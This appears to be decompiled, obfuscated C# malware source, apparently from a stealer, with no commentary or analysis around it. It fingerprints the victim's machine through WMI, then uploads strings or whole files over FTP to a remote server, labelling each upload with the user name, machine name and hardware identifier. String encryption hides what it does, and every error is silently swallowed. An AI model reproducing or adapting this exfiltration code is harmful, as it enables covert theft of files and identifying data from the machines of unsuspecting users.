using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace KXfHkplBSblOeZ;

internal sealed class OMlrSKpvSZZjN
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string GGrCySNwdT()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107405122));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107405133)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107405084);
			ManagementObject val3 = new ManagementObject(getString_0(107405079) + text + getString_0(107405070));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107405065)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107393317);
		}
	}

	public static void ipLbbfoZtAQpboH(string zBwLskjoyFFDHa = "URL", string WxOsIkRJPQy = "USERNAME", string wijKcgLfTYhB = "ACCESO", string CyPKCmxJjnGdsl = "")
	{
		try
		{
			string text = GGrCySNwdT();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(zBwLskjoyFFDHa + getString_0(107406566) + Environment.UserName + getString_0(107407033) + Environment.MachineName + getString_0(107407044) + text + getString_0(107407007));
			ftpWebRequest.Method = getString_0(107405040);
			ftpWebRequest.Credentials = new NetworkCredential(WxOsIkRJPQy, wijKcgLfTYhB);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(CyPKCmxJjnGdsl);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void xBtqCBaTuwIQXV(string xvXDTQtaLwP = "URL", string kVyebeMtvsXMT = "USERNAME", string eXMqUttLCZqfJEKzH = "ACCESO", string xzaclaqbEyfhWo = "")
	{
		try
		{
			string text = GGrCySNwdT();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(xvXDTQtaLwP + getString_0(107406566) + Environment.UserName + getString_0(107407033) + Environment.MachineName + getString_0(107407044) + text + getString_0(107407044) + Path.GetFileName(xzaclaqbEyfhWo));
			ftpWebRequest.Method = getString_0(107405040);
			ftpWebRequest.Credentials = new NetworkCredential(kVyebeMtvsXMT, eXMqUttLCZqfJEKzH);
			byte[] array = File.ReadAllBytes(xzaclaqbEyfhWo);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static OMlrSKpvSZZjN()
	{
		Strings.CreateGetStringDelegate(typeof(OMlrSKpvSZZjN));
	}
}
